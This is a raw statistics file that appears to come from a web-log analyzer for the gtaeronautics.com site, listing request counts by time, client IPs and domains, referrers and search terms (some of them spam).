5	Rr	1	0.000	2022	05	06	10	50
5	Rr	0	0.000	2022	05	06	10	45
5	Rr	0	0.000	2022	05	06	10	40
5	Rr	0	0.000	2022	05	06	10	35
5	Rr	0	0.000	2022	05	06	10	30
5	Rr	0	0.000	2022	05	06	10	25
5	Rr	0	0.000	2022	05	06	10	20
5	Rr	0	0.000	2022	05	06	10	15
5	Rr	0	0.000	2022	05	06	10	10
5	Rr	0	0.000	2022	05	06	10	05
5	Rr	0	0.000	2022	05	06	10	00
5	Rr	1	0.000	2022	05	06	09	55
5	Rr	0	0.000	2022	05	06	09	50
5	Rr	0	0.000	2022	05	06	09	45
5	Rr	0	0.000	2022	05	06	09	40
5	Rr	1	0.000	2022	05	06	09	35
5	Rr	2	0.000	2022	05	06	09	30
5	Rr	0	0.000	2022	05	06	09	25
5	Rr	0	0.000	2022	05	06	09	20
5	Rr	5	0.000	2022	05	06	09	15
5	Rr	2	0.000	2022	05	06	09	10
5	Rr	1	0.000	2022	05	06	09	05
5	Rr	0	0.000	2022	05	06	09	00
5	Rr	0	0.000	2022	05	06	08	55
5	Rr	1	0.000	2022	05	06	08	50
5	Rr	0	0.000	2022	05	06	08	45
5	Rr	0	0.000	2022	05	06	08	40
5	Rr	2	0.000	2022	05	06	08	35
5	Rr	0	0.000	2022	05	06	08	30
5	Rr	0	0.000	2022	05	06	08	25
5	Rr	0	0.000	2022	05	06	08	20
5	Rr	0	0.000	2022	05	06	08	15
5	Rr	0	0.000	2022	05	06	08	10
5	Rr	1	0.000	2022	05	06	08	05
5	Rr	1	0.000	2022	05	06	08	00
5	Rr	0	0.000	2022	05	06	07	55
5	Rr	0	0.000	2022	05	06	07	50
5	Rr	0	0.000	2022	05	06	07	45
5	Rr	0	0.000	2022	05	06	07	40
5	Rr	0	0.000	2022	05	06	07	35
5	Rr	0	0.000	2022	05	06	07	30
5	Rr	1	0.000	2022	05	06	07	25
5	Rr	0	0.000	2022	05	06	07	20
5	Rr	0	0.000	2022	05	06	07	15
5	Rr	0	0.000	2022	05	06	07	10
5	Rr	1	0.000	2022	05	06	07	05
5	Rr	0	0.000	2022	05	06	07	00
5	Rr	0	0.000	2022	05	06	06	55
5	Rr	0	0.000	2022	05	06	06	50
5	Rr	0	0.000	2022	05	06	06	45
5	Rr	1	0.000	2022	05	06	06	40
5	Rr	0	0.000	2022	05	06	06	35
5	Rr	0	0.000	2022	05	06	06	30
5	Rr	0	0.000	2022	05	06	06	25
5	Rr	0	0.000	2022	05	06	06	20
5	Rr	0	0.000	2022	05	06	06	15
5	Rr	0	0.000	2022	05	06	06	10
5	Rr	1	0.000	2022	05	06	06	05
5	Rr	0	0.000	2022	05	06	06	00
5	Rr	1	0.000	2022	05	06	05	55
5	Rr	1	0.000	2022	05	06	05	50
5	Rr	1	0.000	2022	05	06	05	45
5	Rr	0	0.000	2022	05	06	05	40
5	Rr	0	0.000	2022	05	06	05	35
5	Rr	0	0.000	2022	05	06	05	30
5	Rr	20	0.002	2022	05	06	05	25
5	Rr	0	0.000	2022	05	06	05	20
5	Rr	0	0.000	2022	05	06	05	15
5	Rr	0	0.000	2022	05	06	05	10
5	Rr	1	0.000	2022	05	06	05	05
5	Rr	1	0.000	2022	05	06	05	00
5	Rr	0	0.000	2022	05	06	04	55
5	Rr	1	0.000	2022	05	06	04	50
5	Rr	1	0.000	2022	05	06	04	45
5	Rr	0	0.000	2022	05	06	04	40
5	Rr	1	0.000	2022	05	06	04	35
5	Rr	0	0.000	2022	05	06	04	30
5	Rr	21	0.002	2022	05	06	04	25
5	Rr	0	0.000	2022	05	06	04	20
5	Rr	0	0.000	2022	05	06	04	15
5	Rr	2	0.000	2022	05	06	04	10
5	Rr	1	0.000	2022	05	06	04	05
5	Rr	0	0.000	2022	05	06	04	00
5	Rr	1	0.000	2022	05	06	03	55
5	Rr	0	0.000	2022	05	06	03	50
5	Rr	0	0.000	2022	05	06	03	45
5	Rr	1	0.000	2022	05	06	03	40
5	Rr	0	0.000	2022	05	06	03	35
5	Rr	1	0.000	2022	05	06	03	30
5	Rr	0	0.000	2022	05	06	03	25
5	Rr	0	0.000	2022	05	06	03	20
5	Rr	0	0.000	2022	05	06	03	15
5	Rr	0	0.000	2022	05	06	03	10
5	Rr	2	0.000	2022	05	06	03	05
5	Rr	0	0.000	2022	05	06	03	00
5	Rr	1	0.000	2022	05	06	02	55
5	Rr	0	0.000	2022	05	06	02	50
5	Rr	1	0.000	2022	05	06	02	45
5	Rr	1	0.000	2022	05	06	02	40
5	Rr	2	0.000	2022	05	06	02	35
5	Rr	0	0.000	2022	05	06	02	30
5	Rr	0	0.000	2022	05	06	02	25
5	Rr	1	0.000	2022	05	06	02	20
5	Rr	0	0.000	2022	05	06	02	15
5	Rr	2	0.000	2022	05	06	02	10
5	Rr	0	0.000	2022	05	06	02	05
5	Rr	0	0.000	2022	05	06	02	00
5	Rr	1	0.000	2022	05	06	01	55
5	Rr	0	0.000	2022	05	06	01	50
5	Rr	0	0.000	2022	05	06	01	45
5	Rr	1	0.000	2022	05	06	01	40
5	Rr	2	0.000	2022	05	06	01	35
5	Rr	0	0.000	2022	05	06	01	30
5	Rr	0	0.000	2022	05	06	01	25
5	Rr	0	0.000	2022	05	06	01	20
5	Rr	0	0.000	2022	05	06	01	15
5	Rr	1	0.000	2022	05	06	01	10
5	Rr	0	0.000	2022	05	06	01	05
5	Rr	0	0.000	2022	05	06	01	00
5	Rr	0	0.000	2022	05	06	00	55
5	Rr	0	0.000	2022	05	06	00	50
5	Rr	0	0.000	2022	05	06	00	45
5	Rr	0	0.000	2022	05	06	00	40
5	Rr	0	0.000	2022	05	06	00	35
5	Rr	29	0.003	2022	05	06	00	30
5	Rr	0	0.000	2022	05	06	00	25
5	Rr	0	0.000	2022	05	06	00	20
5	Rr	0	0.000	2022	05	06	00	15
5	Rr	0	0.000	2022	05	06	00	10
5	Rr	1	0.000	2022	05	06	00	05
5	Rr	4	0.000	2022	05	06	00	00
5	*BT	R	715	2020	12	11	23	20
7	Rr	3095	0.298	00	00
7	Rr	3657	0.352	00	05
7	Rr	3264	0.314	00	10
7	Rr	2834	0.273	00	15
7	Rr	3424	0.330	00	20
7	Rr	3846	0.370	00	25
7	Rr	3354	0.323	00	30
7	Rr	3304	0.318	00	35
7	Rr	3446	0.332	00	40
7	Rr	3528	0.340	00	45
7	Rr	3664	0.353	00	50
7	Rr	3222	0.310	00	55
7	Rr	3008	0.290	01	00
7	Rr	3346	0.322	01	05
7	Rr	3423	0.330	01	10
7	Rr	3338	0.321	01	15
7	Rr	3477	0.335	01	20
7	Rr	3147	0.303	01	25
7	Rr	3203	0.308	01	30
7	Rr	3434	0.331	01	35
7	Rr	3432	0.330	01	40
7	Rr	3276	0.315	01	45
7	Rr	3101	0.299	01	50
7	Rr	3467	0.334	01	55
7	Rr	3172	0.305	02	00
7	Rr	3269	0.315	02	05
7	Rr	3160	0.304	02	10
7	Rr	3710	0.357	02	15
7	Rr	3439	0.331	02	20
7	Rr	3457	0.333	02	25
7	Rr	3377	0.325	02	30
7	Rr	3611	0.348	02	35
7	Rr	3342	0.322	02	40
7	Rr	3270	0.315	02	45
7	Rr	3032	0.292	02	50
7	Rr	3644	0.351	02	55
7	Rr	3327	0.320	03	00
7	Rr	3100	0.298	03	05
7	Rr	3126	0.301	03	10
7	Rr	3385	0.326	03	15
7	Rr	3094	0.298	03	20
7	Rr	3007	0.289	03	25
7	Rr	3124	0.301	03	30
7	Rr	3346	0.322	03	35
7	Rr	3336	0.321	03	40
7	Rr	3625	0.349	03	45
7	Rr	4263	0.410	03	50
7	Rr	3413	0.329	03	55
7	Rr	3153	0.304	04	00
7	Rr	3190	0.307	04	05
7	Rr	3404	0.328	04	10
7	Rr	3432	0.330	04	15
7	Rr	3570	0.344	04	20
7	Rr	3277	0.315	04	25
7	Rr	3254	0.313	04	30
7	Rr	2985	0.287	04	35
7	Rr	2983	0.287	04	40
7	Rr	3488	0.336	04	45
7	Rr	3035	0.292	04	50
7	Rr	3113	0.300	04	55
7	Rr	2845	0.274	05	00
7	Rr	2774	0.267	05	05
7	Rr	3302	0.318	05	10
7	Rr	3202	0.308	05	15
7	Rr	3388	0.326	05	20
7	Rr	3220	0.310	05	25
7	Rr	3370	0.324	05	30
7	Rr	3196	0.308	05	35
7	Rr	2888	0.278	05	40
7	Rr	2914	0.281	05	45
7	Rr	2829	0.272	05	50
7	Rr	3050	0.294	05	55
7	Rr	3004	0.289	06	00
7	Rr	3665	0.353	06	05
7	Rr	3176	0.306	06	10
7	Rr	3096	0.298	06	15
7	Rr	2887	0.278	06	20
7	Rr	2952	0.284	06	25
7	Rr	2927	0.282	06	30
7	Rr	3001	0.289	06	35
7	Rr	3119	0.300	06	40
7	Rr	3225	0.310	06	45
7	Rr	2621	0.252	06	50
7	Rr	2602	0.250	06	55
7	Rr	3186	0.307	07	00
7	Rr	2812	0.271	07	05
7	Rr	2865	0.276	07	10
7	Rr	2751	0.265	07	15
7	Rr	3072	0.296	07	20
7	Rr	3399	0.327	07	25
7	Rr	3398	0.327	07	30
7	Rr	3073	0.296	07	35
7	Rr	2745	0.264	07	40
7	Rr	2800	0.270	07	45
7	Rr	2653	0.255	07	50
7	Rr	2769	0.267	07	55
7	Rr	2869	0.276	08	00
7	Rr	3116	0.300	08	05
7	Rr	2895	0.279	08	10
7	Rr	2757	0.265	08	15
7	Rr	2831	0.273	08	20
7	Rr	2868	0.276	08	25
7	Rr	3289	0.317	08	30
7	Rr	2909	0.280	08	35
7	Rr	2802	0.270	08	40
7	Rr	2669	0.257	08	45
7	Rr	2655	0.256	08	50
7	Rr	2671	0.257	08	55
7	Rr	2659	0.256	09	00
7	Rr	2955	0.284	09	05
7	Rr	2755	0.265	09	10
7	Rr	2610	0.251	09	15
7	Rr	3014	0.290	09	20
7	Rr	2778	0.267	09	25
7	Rr	2794	0.269	09	30
7	Rr	2565	0.247	09	35
7	Rr	2809	0.270	09	40
7	Rr	2797	0.269	09	45
7	Rr	2458	0.237	09	50
7	Rr	2747	0.264	09	55
7	Rr	2644	0.255	10	00
7	Rr	2522	0.243	10	05
7	Rr	2724	0.262	10	10
7	Rr	2561	0.247	10	15
7	Rr	2469	0.238	10	20
7	Rr	2916	0.281	10	25
7	Rr	2644	0.255	10	30
7	Rr	2658	0.256	10	35
7	Rr	2794	0.269	10	40
7	Rr	2642	0.254	10	45
7	Rr	3365	0.324	10	50
7	Rr	3195	0.308	10	55
7	Rr	4141	0.399	11	00
7	Rr	3097	0.298	11	05
7	Rr	2962	0.285	11	10
7	Rr	2902	0.279	11	15
7	Rr	2970	0.286	11	20
7	Rr	2776	0.267	11	25
7	Rr	3152	0.303	11	30
7	Rr	2812	0.271	11	35
7	Rr	2977	0.287	11	40
7	Rr	2989	0.288	11	45
7	Rr	2949	0.284	11	50
7	Rr	3025	0.291	11	55
7	Rr	3571	0.344	12	00
7	Rr	3239	0.312	12	05
7	Rr	3286	0.316	12	10
7	Rr	2813	0.271	12	15
7	Rr	2998	0.289	12	20
7	Rr	2940	0.283	12	25
7	Rr	2979	0.287	12	30
7	Rr	2805	0.270	12	35
7	Rr	3068	0.295	12	40
7	Rr	3173	0.305	12	45
7	Rr	2864	0.276	12	50
7	Rr	3004	0.289	12	55
7	Rr	3059	0.294	13	00
7	Rr	3080	0.297	13	05
7	Rr	3407	0.328	13	10
7	Rr	3115	0.300	13	15
7	Rr	3062	0.295	13	20
7	Rr	3256	0.313	13	25
7	Rr	3294	0.317	13	30
7	Rr	3682	0.354	13	35
7	Rr	3136	0.302	13	40
7	Rr	2847	0.274	13	45
7	Rr	3432	0.330	13	50
7	Rr	3349	0.322	13	55
7	Rr	3471	0.334	14	00
7	Rr	3689	0.355	14	05
7	Rr	3796	0.365	14	10
7	Rr	3966	0.382	14	15
7	Rr	3737	0.360	14	20
7	Rr	3809	0.367	14	25
7	Rr	4056	0.390	14	30
7	Rr	3845	0.370	14	35
7	Rr	3522	0.339	14	40
7	Rr	3674	0.354	14	45
7	Rr	3696	0.356	14	50
7	Rr	4098	0.395	14	55
7	Rr	4265	0.411	15	00
7	Rr	4399	0.423	15	05
7	Rr	3920	0.377	15	10
7	Rr	4022	0.387	15	15
7	Rr	3807	0.366	15	20
7	Rr	4252	0.409	15	25
7	Rr	4600	0.443	15	30
7	Rr	4022	0.387	15	35
7	Rr	4393	0.423	15	40
7	Rr	4372	0.421	15	45
7	Rr	4393	0.423	15	50
7	Rr	4711	0.454	15	55
7	Rr	4500	0.433	16	00
7	Rr	4665	0.449	16	05
7	Rr	4441	0.428	16	10
7	Rr	4863	0.468	16	15
7	Rr	4529	0.436	16	20
7	Rr	4150	0.400	16	25
7	Rr	4566	0.440	16	30
7	Rr	4780	0.460	16	35
7	Rr	4645	0.447	16	40
7	Rr	4729	0.455	16	45
7	Rr	4731	0.455	16	50
7	Rr	4554	0.438	16	55
7	Rr	4661	0.449	17	00
7	Rr	4555	0.439	17	05
7	Rr	4894	0.471	17	10
7	Rr	4463	0.430	17	15
7	Rr	4559	0.439	17	20
7	Rr	4621	0.445	17	25
7	Rr	4731	0.455	17	30
7	Rr	4746	0.457	17	35
7	Rr	4612	0.444	17	40
7	Rr	4689	0.451	17	45
7	Rr	4534	0.436	17	50
7	Rr	4481	0.431	17	55
7	Rr	4097	0.394	18	00
7	Rr	4450	0.428	18	05
7	Rr	5146	0.495	18	10
7	Rr	4828	0.465	18	15
7	Rr	4454	0.429	18	20
7	Rr	4901	0.472	18	25
7	Rr	4612	0.444	18	30
7	Rr	4780	0.460	18	35
7	Rr	4748	0.457	18	40
7	Rr	4730	0.455	18	45
7	Rr	4733	0.456	18	50
7	Rr	4890	0.471	18	55
7	Rr	5209	0.501	19	00
7	Rr	4899	0.472	19	05
7	Rr	4805	0.463	19	10
7	Rr	4493	0.433	19	15
7	Rr	4540	0.437	19	20
7	Rr	4315	0.415	19	25
7	Rr	4333	0.417	19	30
7	Rr	4586	0.441	19	35
7	Rr	4745	0.457	19	40
7	Rr	4868	0.469	19	45
7	Rr	4333	0.417	19	50
7	Rr	4468	0.430	19	55
7	Rr	4389	0.423	20	00
7	Rr	5003	0.482	20	05
7	Rr	4790	0.461	20	10
7	Rr	4449	0.428	20	15
7	Rr	4717	0.454	20	20
7	Rr	4531	0.436	20	25
7	Rr	4111	0.396	20	30
7	Rr	4279	0.412	20	35
7	Rr	4627	0.445	20	40
7	Rr	4863	0.468	20	45
7	Rr	4391	0.423	20	50
7	Rr	4627	0.445	20	55
7	Rr	5068	0.488	21	00
7	Rr	4335	0.417	21	05
7	Rr	4450	0.428	21	10
7	Rr	4340	0.418	21	15
7	Rr	3852	0.371	21	20
7	Rr	4538	0.437	21	25
7	Rr	3958	0.381	21	30
7	Rr	4214	0.406	21	35
7	Rr	4201	0.404	21	40
7	Rr	4253	0.409	21	45
7	Rr	4496	0.433	21	50
7	Rr	3943	0.380	21	55
7	Rr	4013	0.386	22	00
7	Rr	3847	0.370	22	05
7	Rr	4067	0.392	22	10
7	Rr	3626	0.349	22	15
7	Rr	4160	0.400	22	20
7	Rr	4214	0.406	22	25
7	Rr	3800	0.366	22	30
7	Rr	4220	0.406	22	35
7	Rr	3801	0.366	22	40
7	Rr	3763	0.362	22	45
7	Rr	3965	0.382	22	50
7	Rr	3717	0.358	22	55
7	Rr	4174	0.402	23	00
7	Rr	3863	0.372	23	05
7	Rr	3819	0.368	23	10
7	Rr	3771	0.363	23	15
7	Rr	4564	0.439	23	20
7	Rr	3661	0.352	23	25
7	Rr	3462	0.333	23	30
7	Rr	3786	0.364	23	35
7	Rr	3474	0.334	23	40
7	Rr	3447	0.332	23	45
7	Rr	3501	0.337	23	50
7	Rr	3236	0.312	23	55
o	*f	0R	r
o	lRQ	1	1038749	2895369463	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	43996	2.874	66.249
Z	lRb	1	40552	1.705	69
Z	lRb	1	29142	2.074	35
Z	lRb	1	25047	0.833	46
Z	lRb	1	22911	2.838	157.55
Z	lRb	1	22233	3.460	70
Z	lRb	1	20452	1.501	34
Z	lRb	1	17885	2.256	207.46
Z	lRb	1	17873	2.047	54
Z	lRb	1	16983	2.524	40
Z	lRb	1	15677	1.341	76
Z	lRb	1	13595	1.543	72
Z	lRb	1	12416	1.213	5
Z	lRb	1	12180	1.116	75
Z	lRb	1	12111	0.091	178.137
Z	lRb	1	11683	1.050	123
Z	lRb	1	10957	0.830	74
Z	lRb	1	10125	0.663	71
Z	lRb	1	9790	1.075	104
Z	lRb	1	9231	0.506	37
Z	lRb	1	663910	68.459	[not listed: 8755]
S	*f	-50P	r
S	Rb	4702	0.395	14.33.246.211
S	Rb	3866	0.796	192.234.235.103
S	Rb	3248	0.247	192.99.15.146
S	Rb	2341	0.137	100.43.83.148
S	Rb	1992	0.069	66.249.75.109
S	Rb	1829	0.149	37.59.14.116
S	Rb	1781	0.216	75.98.173.33
S	Rb	1597	0.131	78.155.138.20
S	Rb	1543	0.074	199.21.99.79
S	Rb	1459	0.010	92.249.127.111
S	Rb	1330	0.018	109.102.111.58
S	Rb	1312	0.045	205.203.134.197
S	Rb	1304	0.193	5.196.13.127
S	Rb	1276	0.120	208.115.113.82
S	Rb	1270	0.065	95.108.248.29
S	Rb	1266	0.042	49.7.20.102
S	Rb	1155	0.233	75.98.173.84
S	Rb	1144	0.208	79.125.27.96
S	Rb	1142	0.001	91.207.9.226
S	Rb	1107	0.016	66.249.69.97
S	Rb	1081	0.019	66.249.69.81
S	Rb	1076	0.019	49.7.20.111
S	Rb	1051	0.032	66.249.69.192
S	Rb	1047	0.017	106.38.241.144
S	Rb	1039	0.015	66.249.69.89
S	Rb	1030	0.098	5.255.250.90
S	Rb	1024	0.074	95.108.150.235
S	Rb	1012	0.082	192.99.6.132
S	Rb	957	0.183	199.21.99.197
S	Rb	951	0.062	66.249.73.133
S	Rb	925	0.038	144.76.27.118
S	Rb	839	0.119	216.244.66.229
S	Rb	815	0.030	178.63.23.80
S	Rb	812	0.094	66.249.64.90
S	Rb	808	0.183	149.202.211.239
S	Rb	791	0.065	192.99.7.55
S	Rb	786	0.117	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.051	208.115.113.92
S	Rb	744	0.010	109.102.111.20
S	Rb	739	0.010	109.102.111.50
S	Rb	721	0.004	106.38.241.177
S	Rb	704	0.001	109.120.157.179
S	Rb	698	0.025	220.181.125.162
S	Rb	694	0.039	78.155.138.30
S	Rb	686	0.020	66.249.65.212
S	Rb	670	0.044	49.7.20.108
S	Rb	664	0.054	94.23.59.173
S	Rb	653	0.073	52.21.132.215
S	Rb	649	0.053	46.105.74.59
S	Rb	976882	95.203	[not listed: 92074]
s	*FR	2013	12	18	21	53
s	*LR	2022	05	06	17	12
s	*f	-20R	s
s	lRS	1	213149	527	http://www.gtaeronautics.com/
s	lRS	1	51501	77	http://gtaeronautics.com/
s	lRS	1	5188	9	https://www.google.com/
s	lRS	1	261	1	https://www.bing.com/
s	lRS	1	1553	0	http://www.google.com/
s	lRS	1	1246	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	327	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	280	0	https://www.thomasnet.com/
s	lRS	1	280	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	236	0	http://www.thomasnet.com/
s	lRS	1	234	0	http://www.artparquet.ru/
s	lRS	1	48744	2	[not listed: 4345]
f	*FR	2013	12	18	21	53
f	*LR	2022	05	06	17	12
f	*f	-30R	s
f	lRS	1	145363	468	http://www.gtaeronautics.com/
f	lRS	1	35336	49	http://gtaeronautics.com/
f	lRS	1	9981	22	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	6108	8	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	4782	8	https://www.google.com/
f	lRS	1	1538	7	http://gtaeronautics.com/aboutus.html
f	lRS	1	7144	6	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	1656	6	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	1092	3	http://gtaeronautics.com/index.html
f	lRS	1	5624	2	http://gtaeronautics.com/IndNews.html
f	lRS	1	2587	2	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	2032	2	http://www.gtaeronautics.com/RD.html
f	lRS	1	1454	2	http://www.gtaeronautics.com/contactus.html
f	lRS	1	1132	1	http://www.gtaeronautics.com/links.html
f	lRS	1	4550	0	http://www.gtaeronautics.com/index.html
f	lRS	1	4365	0	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	2557	0	http://www.gtaeronautics.com/pna.html
f	lRS	1	2301	0	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	2167	0	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	2035	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	1947	0	http://www.gtaeronautics.com/SRU.html
f	lRS	1	1855	0	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	1744	0	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	1708	0	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	1575	0	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	1268	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	1159	0	http://www.trainingindustry.com/
f	lRS	1	1080	0	http://www.baidu.com/s
f	lRS	1	898	0	http://www.gtaeronautics.com/FAQ.html
f	lRS	1	892	0	http://www.google.com/url
f	lRS	1	69740	30	[not listed: 5006]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	47.634	kit
n	Rq	1	47.634	method
n	Rq	2	95.268	crew
n	Rq	28	84.034	aeronautical
n	Rq	1	47.634	airplane.com
n	Rq	5	117.681	faa
n	Rq	40	8.370	gt
n	Rq	1	47.634	moldings
n	Rq	1	47.634	twin
n	Rq	1	47.634	taranis
n	Rq	2	47.634	installerex
n	Rq	2	47.634	http://gtaeronautics.com/
n	Rq	20	114.873	in
n	Rq	1	47.634	scale
n	Rq	1	47.634	observer
n	Rq	1	47.634	drawing?
n	Rq	2	47.634	is
n	Rq	1	47.634	making
n	Rq	2	95.268	fiber
n	Rq	1	47.634	mitsubishi
n	Rq	1	47.634	fuze
n	Rq	1	47.634	http://www.gtaeronautics.com/indnews.html
n	Rq	92	47.634	semalt.com
n	Rq	1	47.634	consultant
n	Rq	15	70.047	manufacturing
n	Rq	1	47.634	2
n	Rq	1	47.634	base
n	Rq	14	64.430	6
n	Rq	1	47.634	http://gtaeronautics.com/indnews.html
n	Rq	1	47.634	always
n	Rq	28	106.447	engineering
n	Rq	1	47.634	northrop
n	Rq	1	47.634	bandwidth
n	Rq	1	47.634	vegas
n	Rq	3	95.268	basic
n	Rq	1	47.634	qinetiq
n	Rq	1	47.634	tooling
n	Rq	1	47.634	on
n	Rq	1	47.634	heavy
n	Rq	9	19.604	drawings
n	Rq	1	47.634	fia
n	Rq	4	47.634	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	47.634	llc
n	Rq	3	22.413	rullman
n	Rq	1	47.634	cowling
n	Rq	32	22.413	sale
n	Rq	64	44.826	outlet
n	Rq	1	47.634	rotax
n	Rq	1	47.634	ucav
n	Rq	28	58.813	texan
n	Rq	1	47.634	a
n	Rq	2	47.634	customer
n	Rq	1	47.634	rpa
n	Rq	2	95.268	110cc
n	Rq	30	47.634	designer
n	Rq	20	117.681	www.gtaeronautics.com
n	Rq	1	47.634	work
n	Rq	1	47.634	thomas
n	Rq	1	47.634	engie
n	Rq	1	47.634	qualification
n	Rq	1	47.634	custom
n	Rq	1	47.634	mk3
n	Rq	1	47.634	t
n	Rq	1	47.634	uavs
n	Rq	1	47.634	w
n	Rq	2	47.634	satisfaction
n	Rq	2	95.268	x
n	Rq	1	47.634	crews
n	Rq	3	47.634	photos
n	Rq	1	47.634	finnemeccia
n	Rq	2	95.268	glass
n	Rq	1	22.413	to
n	Rq	1	47.634	gcs
n	Rq	5	117.681	engineer
n	Rq	1	47.634	government
n	Rq	1	47.634	operator
n	Rq	6	44.826	aircraft
n	Rq	1	47.634	with
n	Rq	97	95.268	number
n	Rq	4	22.413	for
n	Rq	1	47.634	december
n	Rq	2	95.268	aero
n	Rq	9	95.268	equipment
n	Rq	2	95.268	engine
n	Rq	1	47.634	mq1
n	Rq	2	95.268	wy
n	Rq	1	47.634	custum
n	Rq	1	47.634	g.t
n	Rq	1	47.634	mechanics
n	Rq	1	95.268	motors
n	Rq	1	47.634	tdw
n	Rq	32	117.681	luggage
n	Rq	1	47.634	opportunities
n	Rq	175	86.843	vuitton
n	Rq	1	47.634	show
n	Rq	1	22.413	the
n	Rq	1	47.634	luggages
n	Rq	1	47.634	stroke
n	Rq	2	47.634	explore
n	Rq	39	95.268	handbags
n	Rq	2	95.268	electric
n	Rq	1	47.634	space
n	Rq	1	95.268	air
n	Rq	1	47.634	quote
n	Rq	1	47.634	require
n	Rq	1	47.634	mpp
n	Rq	4	95.268	jobs
n	Rq	5	117.681	uas
n	Rq	1	47.634	anything
n	Rq	1	47.634	china
n	Rq	1	47.634	airplane
n	Rq	10	114.873	uav
n	Rq	2	47.634	wmaid.com
n	Rq	3	70.047	drone
n	Rq	7	92.460	fiberglass
n	Rq	2	47.634	facebook
n	Rq	1	47.634	college
n	Rq	4	70.047	onboard
n	Rq	3	95.268	gtaeronautics.com
n	Rq	1	47.634	qulificationa
n	Rq	21	16.796	simi
n	Rq	1	47.634	and
n	Rq	5	22.413	flight
n	Rq	17	16.796	at6
n	Rq	1	47.634	xtreme
n	Rq	1	47.634	maintenance
n	Rq	1	47.634	cody
n	Rq	1	47.634	systems
n	Rq	1	47.634	any
n	Rq	1	47.634	tom
n	Rq	1	47.634	payload
n	Rq	2	95.268	gta
n	Rq	2	47.634	granger
n	Rq	8	92.460	extreme
n	Rq	6	117.681	molding
n	Rq	2	47.634	easylifeapp
n	Rq	1	47.634	rating
n	Rq	2	47.634	whitelaw
n	Rq	126	92.460	fashion
n	Rq	2	95.268	ice
n	Rq	2	47.634	http://www.gtaeronautics.com/compnews.html
n	Rq	5	95.268	engineers
n	Rq	3	95.268	composite
n	Rq	1	47.634	skyforce
n	Rq	1	47.634	eengineer
n	Rq	175	86.843	louis
n	Rq	8	47.634	store
n	Rq	4	70.047	starter
n	Rq	14	70.047	cheap
n	Rq	1	47.634	diamond
n	Rq	10	67.239	bme
n	Rq	1	47.634	america2009
n	Rq	7	47.634	content
n	Rq	1	47.634	challenge
n	Rq	2	95.268	aeronautic
n	Rq	1	47.634	piece
n	Rq	1	47.634	how
n	Rq	1	47.634	male
n	Rq	2	95.268	design
n	Rq	2	95.268	flying
n	Rq	1	47.634	carbon
n	Rq	1	47.634	operation
n	Rq	2	47.634	profile
n	Rq	1	47.634	tomas
n	Rq	1	47.634	cia
n	Rq	1	47.634	hummingbird
n	Rq	1	47.634	iron
n	Rq	1	47.634	california
n	Rq	1	47.634	amphibian
n	Rq	1	47.634	110
n	Rq	1	47.634	mentioned
n	Rq	1	47.634	111
n	Rq	1	47.634	over
n	Rq	25	84.034	http://www.gtaeronautics.com/
n	Rq	1	47.634	google.com
n	Rq	1	47.634	fuel
n	Rq	2	47.634	inc
n	Rq	1	47.634	handbag.com
n	Rq	1	47.634	da42
n	Rq	2	95.268	certification
n	Rq	1	47.634	timing
n	Rq	1	47.634	2015
n	Rq	1	47.634	home
n	Rq	1	47.634	aerospacecompanies
n	Rq	1	47.634	anti
n	Rq	1	47.634	ziroli
n	Rq	1	47.634	sketches
n	Rq	5	47.634	purses
n	Rq	1	47.634	downlink
n	Rq	3	47.634	aeronotics
n	Rq	1	47.634	nanotechnology
n	Rq	1	47.634	zephyr
n	Rq	4	47.634	wyoming
n	Rq	2	47.634	technology
n	Rq	3	22.413	companies
n	Rq	1	47.634	muffler
n	Rq	2	47.634	avia
n	Rq	2	47.634	what
n	Rq	145	61.622	valley
n	Rq	1	47.634	microwave
n	Rq	1	47.634	mold
n	Rq	5	70.047	pglm
n	Rq	1	47.634	specialist
n	Rq	23	109.256	drawing
n	Rq	1	47.634	tool
n	Rq	1	47.634	security
n	Rq	6	95.268	prototypes
n	Rq	1	47.634	giant
n	Rq	1	47.634	powell
n	Rq	8	92.460	aerospace
n	Rq	4	70.047	unmanned
n	Rq	34	33.592	aeronautics
n	Rq	1	47.634	radius
n	Rq	1	47.634	zero
n	Rq	1	47.634	tobbot
n	Rq	2	95.268	job
n	Rq	2	95.268	neverfull
n	Rq	1	47.634	onbordstarter
n	Rq	20	70.047	ca
n	Rq	1	95.268	as
n	Rq	13	16.796	at
n	Rq	5	117.681	techniques
n	Rq	1	47.634	does
n	Rq	1	47.634	commercial
n	Rq	1	47.634	www.gt
n	Rq	1	47.634	de
n	Rq	1	47.634	co
n	Rq	1	47.634	speedy
n	Rq	1	47.634	rpas
n	Rq	2	95.268	instrument
n	Rq	1	47.634	do
n	Rq	1	47.634	quotation
n	Rq	3	22.413	training
n	Rq	1	47.634	efi
n	Rq	1	47.634	careers
n	Rq	3	22.413	pilot
n	Rq	9	19.604	bandito
n	Rq	4	70.047	quotes
n	Rq	107	70.047	phone
n	Rq	1	47.634	stations
n	Rq	1	47.634	traing
N	*FR	2013	12	19	00	28
N	*LR	2020	10	14	09	11
N	*f	-200Q	s
N	RQ	20	4194854939	www.gtaeronautics.com
